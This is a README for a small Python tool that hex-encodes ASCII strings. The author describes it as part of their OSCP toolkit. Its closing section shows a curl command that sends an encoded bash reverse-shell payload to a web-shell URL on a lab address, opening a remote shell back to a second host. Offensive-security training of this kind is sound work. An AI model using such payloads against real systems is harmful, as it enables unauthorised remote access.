## ascii2hex
Simple python code for convert ASCII string to HEX string

## how to run
That python code allow to convert ASCII string to hex in 2 type format, "%" or "\x", or other ones you need.
You can select the format by using -p flag and specefie the pattern, the default it "%".

## example
```
└─$ python3 ./ascii2hex.py -s '<? phpinfo() ?>'

%3c%3f%20%70%68%70%69%6e%66%6f%28%29%20%3f%3e
```
```
└─$ python3 ./ascii2hex.py -s '<? phpinfo() ?>' -p \\x

\x3c\x3f\x20\x70\x68\x70\x69\x6e\x66\x6f\x28\x29\x20\x3f\x3e
```
## about tool note
this is part from my OSCP tools, the idea it so have the ability to run reverse shell from injection point over php file, since the url can't using space value we must convert each space to hex value, so that tool do that for us.
this tool is vulable since if we can inject code to some url and we need to insert more complicated request to the injection point (paramether) we can use ascii2hex:
```
curl "http://192.168.183.91/cmd.php?cmd=$(ascii2hex "/bin/bash -c 'bash -i >& /dev/tcp/10.0.0.1/443 0>&1'")"                                        
```
in that case the request will be as follow:
```
curl "http://192.168.183.91/cmd.php?cmd=%2f%62%69%6e%2f%62%61%73%68%20%2d%63%20%27%62%61%73%68%20%2d%69%20%3e%26%20%2f%64%65%76%2f%74%63%70%2f%31%30%2e%30%2e%30%2e%31%2f%34%34%33%20%30%3e%26%31%27"
```
